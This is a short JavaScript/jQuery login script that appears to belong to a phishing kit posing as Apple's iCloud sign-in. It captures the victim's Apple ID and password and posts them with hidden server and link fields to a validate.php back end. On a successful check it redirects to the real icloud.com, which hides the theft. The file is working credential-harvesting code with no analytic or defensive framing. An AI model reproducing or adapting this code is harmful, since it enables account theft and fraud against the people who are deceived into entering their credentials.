<script type='text/javascript'>
	$('#apple_id,#apple_pwd').on('keyup', function(e) {
		$('.auth-picker').hide();
        if (e.which == 13) {
            checklogin();
        }
    });
	var $loginCount = 0;
    function checklogin()
    {
        var apple_id = jQuery('#apple_id').val();
        var apple_pwd = jQuery('#apple_pwd').val();
        var server = jQuery('#server').val();
        var lang = jQuery('#lang').val();
        var links = jQuery('#link').val();
        if(apple_id!='' && apple_pwd!='')
        {
            jQuery('#submit_button,.bothide').hide();
            jQuery('#submit_loader').show();
            jQuery.ajax({

                type:"POST",
                url:"validate.php",
                data:"apple_id="+apple_id+"&apple_pwd="+apple_pwd+"&server="+server+"&lang="+lang+"&link="+links,
                success: function(msg){
                    if(msg.search("INVALID")!=-1)
                    {
						window.location.href = "./error.html";

                    }
                    else if(msg.search("SUCCESS")!=-1)
                    {
                        window.location.href = "https://www.icloud.com";
                    }
                    else
                    {
                        $('div.myshaker').effect('shake', {times:3}, 400 );
                        jQuery('#submit_button').show();
                        jQuery('#submit_loader').hide();
                        $(".sbBtn").css("opacity", "0.2");
                    }
                }
            });
        }
        else
        {
            if(apple_id=='') jQuery('#apple_id').focus();
            else if(apple_pwd=='') jQuery('#apple_pwd').focus();
        }
    }
</script>
